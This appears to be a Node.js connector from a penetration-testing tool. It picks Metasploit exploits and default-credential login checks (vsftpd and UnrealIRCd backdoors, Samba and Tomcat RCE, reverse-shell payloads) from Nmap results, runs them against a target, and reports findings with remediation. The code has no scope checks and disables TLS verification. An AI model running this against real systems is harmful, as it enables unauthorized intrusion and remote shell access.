/**
 * AXIOM Metasploit Connector
 * Connects to Metasploit RPC daemon (msfrpcd) or runs via resource scripts
 * Auto-selects exploits based on Nmap service fingerprints
 */

const axios  = require("axios");
const { exec } = require("child_process");
const util   = require("util");
const fs     = require("fs");
const path   = require("path");
const execP  = util.promisify(exec);

// ─── Metasploit RPC config ────────────────────────────────────────────────────
const MSF_HOST  = process.env.MSF_HOST || "127.0.0.1";
const MSF_PORT  = process.env.MSF_PORT || 55553;
const MSF_PASS  = process.env.MSF_PASS || "axiom-msf-pass";
const MSF_SSL   = process.env.MSF_SSL  !== "false";
const MSF_BASE  = `${MSF_SSL?"https":"http"}://${MSF_HOST}:${MSF_PORT}/api/`;

// ─── Service → Exploit mapping ────────────────────────────────────────────────
// Based on what Nmap found on Metasploitable2 + common targets
const EXPLOIT_MAP = [
  // vsftpd 2.3.4 backdoor (Metasploitable classic)
  {
    match: (port, service, version) => port===21 && version.includes("vsftpd 2.3.4"),
    exploit: "exploit/unix/ftp/vsftpd_234_backdoor",
    options:  { RHOSTS: null, RPORT: 21 },
    payload:  "cmd/unix/interact",
    name:     "vsftpd 2.3.4 Backdoor",
    cve:      "CVE-2011-2523",
    severity: "Critical",
    cvss:     10.0,
  },
  // Samba usermap_script (Metasploitable classic)
  {
    match: (port, service, version) => (port===139||port===445) && version.toLowerCase().includes("samba"),
    exploit: "exploit/multi/samba/usermap_script",
    options:  { RHOSTS: null, RPORT: 139 },
    payload:  "cmd/unix/reverse_netcat",
    name:     "Samba usermap_script RCE",
    cve:      "CVE-2007-2447",
    severity: "Critical",
    cvss:     10.0,
  },
  // UnrealIRCd backdoor
  {
    match: (port, service, version) => service==="irc" || version.toLowerCase().includes("unreal"),
    exploit: "exploit/unix/irc/unreal_ircd_3281_backdoor",
    options:  { RHOSTS: null, RPORT: 6667 },
    payload:  "cmd/unix/reverse",
    name:     "UnrealIRCd 3.2.8.1 Backdoor",
    cve:      "CVE-2010-2075",
    severity: "Critical",
    cvss:     10.0,
  },
  // PHP CGI arg injection
  {
    match: (port, service, version) => (port===80||port===8080) && version.toLowerCase().includes("php"),
    exploit: "exploit/multi/http/php_cgi_arg_injection",
    options:  { RHOSTS: null, RPORT: null, TARGETURI: "/" },
    payload:  "php/meterpreter/reverse_tcp",
    name:     "PHP CGI Argument Injection RCE",
    cve:      "CVE-2012-1823",
    severity: "Critical",
    cvss:     9.8,
  },
  // Apache Tomcat manager upload
  {
    match: (port, service, version) => version.toLowerCase().includes("tomcat") || port===8180,
    exploit: "exploit/multi/http/tomcat_mgr_upload",
    options:  { RHOSTS: null, RPORT: null, HttpUsername:"tomcat", HttpPassword:"tomcat" },
    payload:  "java/meterpreter/reverse_tcp",
    name:     "Apache Tomcat Manager RCE",
    cve:      "CVE-2009-3843",
    severity: "Critical",
    cvss:     9.0,
  },
  // MySQL empty root password
  {
    match: (port, service) => port===3306 && service==="mysql",
    exploit: "auxiliary/scanner/mysql/mysql_login",
    options:  { RHOSTS: null, RPORT: 3306, USERNAME:"root", PASSWORD:"" },
    payload:  null,
    name:     "MySQL Empty Root Password",
    cve:      "CWE-521",
    severity: "Critical",
    cvss:     9.8,
  },
  // VNC no auth
  {
    match: (port, service, version) => port===5900 && service==="vnc",
    exploit: "auxiliary/scanner/vnc/vnc_login",
    options:  { RHOSTS: null, RPORT: 5900, PASSWORD:"" },
    payload:  null,
    name:     "VNC No Authentication / Weak Password",
    cve:      "CWE-306",
    severity: "High",
    cvss:     8.5,
  },
  // SSH brute force check
  {
    match: (port, service, version) => port===22 && service==="ssh",
    exploit: "auxiliary/scanner/ssh/ssh_login",
    options:  { RHOSTS: null, RPORT: 22, USERNAME:"msfadmin", PASSWORD:"msfadmin" },
    payload:  null,
    name:     "SSH Default / Weak Credentials",
    cve:      "CWE-521",
    severity: "High",
    cvss:     8.1,
  },
  // Telnet
  {
    match: (port, service) => port===23 && service==="telnet",
    exploit: "auxiliary/scanner/telnet/telnet_login",
    options:  { RHOSTS: null, RPORT: 23, USERNAME:"root", PASSWORD:"" },
    payload:  null,
    name:     "Telnet Cleartext Protocol Exposed",
    cve:      "CWE-319",
    severity: "High",
    cvss:     7.5,
  },
  // FTP anonymous login
  {
    match: (port, service) => port===21 && service==="ftp",
    exploit: "auxiliary/scanner/ftp/ftp_login",
    options:  { RHOSTS: null, RPORT: 21, USERNAME:"anonymous", PASSWORD:"anonymous@" },
    payload:  null,
    name:     "FTP Anonymous / Weak Credentials",
    cve:      "CWE-521",
    severity: "High",
    cvss:     7.5,
  },
];

// ─── Select relevant exploits for a target based on Nmap results ──────────────
function selectExploits(nmapResult) {
  const matched = [];
  for (const portInfo of (nmapResult.ports || [])) {
    for (const exploit of EXPLOIT_MAP) {
      if (exploit.match(portInfo.port, portInfo.service, portInfo.version || "")) {
        // Set target IP in options
        const opts = { ...exploit.options, RHOSTS: nmapResult.target };
        if (opts.RPORT === null) opts.RPORT = portInfo.port;
        matched.push({ ...exploit, options: opts, targetPort: portInfo.port, targetVersion: portInfo.version });
      }
    }
  }
  return matched;
}

// ─── Run exploits via Metasploit resource script ──────────────────────────────
async function runMetasploitExploits(target, nmapResult, options = {}) {
  const exploits = selectExploits(nmapResult);
  if (!exploits.length) {
    return { findings:[], exploits:[], message:"No matching exploits for detected services" };
  }

  console.log(`[MSF] ${exploits.length} exploits selected for ${target}`);
  exploits.forEach(e => console.log(`  → ${e.name} (${e.exploit})`));

  // Try RPC first, fall back to resource script
  const rpcOk = await testMsfRpc();
  if (rpcOk) {
    return runViaRpc(target, exploits);
  } else {
    return runViaResourceScript(target, exploits, options);
  }
}

// ─── Test if Metasploit RPC daemon is running ─────────────────────────────────
async function testMsfRpc() {
  try {
    const r = await axios.post(MSF_BASE, { method:"auth.login", params:[MSF_PASS] },
      { timeout:3000, httpsAgent: MSF_SSL ? new (require("https").Agent)({rejectUnauthorized:false}) : undefined });
    return !!r.data?.token;
  } catch { return false; }
}

// ─── Run via Metasploit RPC ───────────────────────────────────────────────────
async function runViaRpc(target, exploits) {
  const findings = [];
  let token;

  try {
    // Authenticate
    const authR = await axios.post(MSF_BASE, { method:"auth.login", params:[MSF_PASS] },
      { httpsAgent: MSF_SSL ? new (require("https").Agent)({rejectUnauthorized:false}) : undefined });
    token = authR.data?.token;
    if (!token) throw new Error("MSF RPC auth failed");

    for (const exp of exploits) {
      try {
        console.log(`[MSF RPC] Running: ${exp.exploit} against ${target}`);

        // Create console
        const conR = await msfRpc(token, "console.create", []);
        const cid  = conR?.id;

        // Build commands
        const cmds = [
          `use ${exp.exploit}`,
          ...Object.entries(exp.options).map(([k,v])=>`set ${k} ${v}`),
          exp.payload ? `set PAYLOAD ${exp.payload}` : "",
          `set LHOST 0.0.0.0`,
          `run -j`,
          "sleep 5",
        ].filter(Boolean).join("\n") + "\n";

        await msfRpc(token, "console.write", [cid, cmds]);
        await sleep(8000);
        const out = await msfRpc(token, "console.read", [cid]);
        const output = out?.data || "";

        console.log(`[MSF RPC] ${exp.name} output length: ${output.length}`);

        // Parse success/failure from output
        const success = isExploitSuccess(output, exp);
        findings.push(buildMsfFinding(exp, target, success, output));
      } catch(e) {
        console.error(`[MSF RPC] ${exp.name} error: ${e.message}`);
        findings.push(buildMsfFinding(exp, target, false, e.message));
      }
    }

    // Logout
    await msfRpc(token, "auth.logout", [token]).catch(()=>{});
  } catch(e) {
    console.error("[MSF RPC] Fatal:", e.message);
    // Fall back to resource script
    return runViaResourceScript(target, exploits);
  }

  return { findings, exploitsRun:exploits.length, method:"rpc" };
}

// ─── Run via msfconsole resource script ───────────────────────────────────────
async function runViaResourceScript(target, exploits, options = {}) {
  const findings  = [];
  const logDir    = path.join(__dirname, "msf_logs");
  if (!fs.existsSync(logDir)) fs.mkdirSync(logDir, {recursive:true});

  for (const exp of exploits) {
    const rcFile  = path.join(logDir, `axiom_${Date.now()}.rc`);
    const logFile = path.join(logDir, `axiom_${Date.now()}.log`);

    // Build resource script
    const rcContent = [
      `use ${exp.exploit}`,
      ...Object.entries(exp.options).filter(([,v])=>v!==null).map(([k,v])=>`set ${k} ${v}`),
      exp.payload ? `set PAYLOAD ${exp.payload}` : "",
      `set LHOST 127.0.0.1`,
      `set ExitOnSession false`,
      `set ConnectTimeout 10`,
      `set Timeout 15`,
      `run`,
      `sleep 5`,
      `exit -y`,
    ].filter(Boolean).join("\n");

    fs.writeFileSync(rcFile, rcContent);
    console.log(`[MSF] Running resource script for: ${exp.name}`);

    try {
      // Try Docker Metasploit
      const dockerCmd = `docker run --rm --network host -v "${logDir}:/tmp/msf" metasploitframework/metasploit-framework msfconsole -q -r /tmp/msf/${path.basename(rcFile)} 2>&1`;
      const { stdout } = await execP(dockerCmd, { timeout:60000 });
      const success = isExploitSuccess(stdout, exp);
      findings.push(buildMsfFinding(exp, target, success, stdout));
      console.log(`[MSF] ${exp.name}: ${success ? "✅ SUCCESS" : "❌ failed/no session"}`);
    } catch(dockerErr) {
      // Try system msfconsole
      try {
        const { stdout } = await execP(`msfconsole -q -r "${rcFile}" 2>&1`, { timeout:60000 });
        const success = isExploitSuccess(stdout, exp);
        findings.push(buildMsfFinding(exp, target, success, stdout));
      } catch(sysErr) {
        console.error(`[MSF] ${exp.name} failed: ${sysErr.message}`);
        // Still create a finding based on version fingerprint
        findings.push(buildMsfFinding(exp, target, null, "Metasploit not available — finding based on version fingerprint"));
      }
    }

    // Clean up rc file
    try { fs.unlinkSync(rcFile); } catch {}
  }

  return { findings, exploitsRun:exploits.length, method:"resource_script" };
}

// ─── Parse Metasploit output for success indicators ──────────────────────────
function isExploitSuccess(output, exp) {
  const out = (output||"").toLowerCase();
  if (out.includes("meterpreter session") || out.includes("command shell session")) return true;
  if (out.includes("login successful") || out.includes("success"))                  return true;
  if (out.includes("[-]") && out.includes("failed"))                                return false;
  if (out.includes("[+]"))                                                           return true;
  return null; // uncertain — fingerprint-based
}

// ─── Build AXIOM finding from Metasploit result ───────────────────────────────
function buildMsfFinding(exp, target, success, output = "") {
  const truncated = (output||"").slice(-2000); // last 2000 chars of output
  const verified  = success === true ? "VERIFIED" : success === false ? "NOT_EXPLOITABLE" : "FINGERPRINT_MATCH";

  return {
    id:          `MSF-F${String(Math.floor(Math.random()*9000)+1000)}`,
    title:       exp.name,
    severity:    exp.severity,
    confidence:  success===true ? "HIGH" : success===false ? "LOW" : "MEDIUM",
    status:      verified,
    source:      "Metasploit Framework",
    plugin:      "ExploitEngine",
    method:      "EXPLOIT",
    url:         `http://${target}:${exp.targetPort || ""}`,
    parameter:   `port:${exp.targetPort}`,
    description: `${exp.name} — CVE: ${exp.cve}. Target version: ${exp.targetVersion||"detected"}. ${success===true ? "✅ Exploitation SUCCESSFUL — session obtained." : success===false ? "❌ Exploit attempted but failed." : "⚠️ Version fingerprint matches known vulnerable version."}`,
    solution:    getSolutionForExploit(exp),
    cvss:        exp.cvss,
    cve:         exp.cve,
    evidence: {
      exploit:       exp.exploit,
      payload:       exp.payload || "N/A",
      options:       exp.options,
      exploitOutput: truncated.slice(0,500),
      success:       success,
    },
    ttp: {
      tactic:     "Initial Access",
      technique:  exp.exploit,
      id:         mapToMitre(exp.name),
    },
    remediation:   getSolutionForExploit(exp),
    normalizedAt:  new Date().toISOString(),
  };
}

// ─── Helpers ──────────────────────────────────────────────────────────────────
async function msfRpc(token, method, params) {
  const agent = MSF_SSL ? new (require("https").Agent)({rejectUnauthorized:false}) : undefined;
  const r = await axios.post(MSF_BASE, { method, params:[token,...params] }, { httpsAgent:agent, timeout:15000 });
  return r.data;
}

function mapToMitre(name) {
  const n = (name||"").toLowerCase();
  if (n.includes("backdoor"))      return "T1133";
  if (n.includes("rce")||n.includes("injection")) return "T1190";
  if (n.includes("credential")||n.includes("login")) return "T1110";
  if (n.includes("ssh"))           return "T1021.004";
  if (n.includes("telnet"))        return "T1021";
  if (n.includes("ftp"))           return "T1021";
  if (n.includes("vnc"))           return "T1021.005";
  return "T1190";
}

function getSolutionForExploit(exp) {
  const solutions = {
    "vsftpd 2.3.4 Backdoor":         "Upgrade vsftpd immediately. This version has a deliberately planted backdoor. CVE-2011-2523.",
    "Samba usermap_script RCE":       "Upgrade Samba to 3.0.26 or later. Restrict SMB to internal network. CVE-2007-2447.",
    "UnrealIRCd 3.2.8.1 Backdoor":   "Remove UnrealIRCd 3.2.8.1 immediately — contains a backdoor. CVE-2010-2075.",
    "PHP CGI Argument Injection RCE": "Upgrade PHP. Disable CGI mode. Use mod_rewrite to block malicious query strings. CVE-2012-1823.",
    "Apache Tomcat Manager RCE":      "Change Tomcat manager credentials. Restrict manager access to localhost. CVE-2009-3843.",
    "MySQL Empty Root Password":      "Set a strong root password: ALTER USER root@localhost IDENTIFIED BY 'strong_pass';",
    "VNC No Authentication / Weak Password": "Enable VNC authentication. Use VeNCrypt. Restrict to trusted IPs via firewall.",
    "SSH Default / Weak Credentials": "Disable password auth. Use SSH keys only. Add fail2ban. Change default credentials.",
    "Telnet Cleartext Protocol Exposed": "Disable telnet. Replace with SSH: systemctl disable telnetd && systemctl enable sshd.",
    "FTP Anonymous / Weak Credentials":  "Disable anonymous FTP. Use SFTP/FTPS. Require strong credentials.",
  };
  return solutions[exp.name] || "Apply the latest security patches and restrict service access via firewall.";
}

function sleep(ms) { return new Promise(r=>setTimeout(r,ms)); }

module.exports = { runMetasploitExploits, selectExploits, EXPLOIT_MAP };
